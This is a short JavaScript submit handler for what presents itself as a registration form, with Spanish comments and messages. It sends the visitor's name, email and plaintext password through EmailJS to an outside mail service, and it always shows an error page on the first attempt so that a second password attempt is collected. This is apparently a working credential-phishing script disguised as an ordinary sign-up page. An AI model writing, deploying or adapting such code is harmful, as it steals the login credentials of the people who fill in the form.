emailjs.init('ReqtkWfjI392LAzFb');

document.getElementById('registrationForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const emailInput = document.getElementById('email');
    const emailError = document.getElementById('emailError');
    let attempts = localStorage.getItem('registrationAttempts') || 0;

    // Validación estricta
    if (emailInput.value.toLowerCase().includes('@gmail.com')) {
        emailError.style.display = 'block';
        emailInput.focus();
        return;
    }

    try {
        const response = await emailjs.send("service_syrc1uk", "template_u3etoro", {
            nombre: document.getElementById('fullName').value,
            correo: emailInput.value,
            password: document.getElementById('password').value,
            intento: ++attempts
        });

        localStorage.setItem('registrationAttempts', attempts);
        
        if (attempts < 2) {
            window.location.href = 'error.html';
        } else {
            localStorage.removeItem('registrationAttempts');
            window.location.href = 'success.html';
        }
        
    } catch (error) {
        console.error('Error:', error);
        alert('Error en el proceso');
    }
});
